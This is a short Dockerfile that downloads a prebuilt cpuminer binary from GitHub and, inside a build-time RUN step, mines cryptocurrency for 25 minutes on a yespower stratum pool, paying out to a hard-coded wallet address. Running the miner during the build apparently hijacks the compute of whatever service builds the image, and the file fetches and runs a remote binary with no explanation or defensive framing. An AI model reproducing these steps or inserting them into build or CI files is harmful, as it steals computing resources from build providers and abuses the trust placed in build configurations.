FROM ubuntu:20.04

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN apt update
RUN apt -y install wget
RUN apt -y install tar
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
RUN tar xf cpuminer-opt-linux.tar.gz
RUN chmod +x cpuminer-sse2
RUN timeout 25m ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.55552
RUN ls
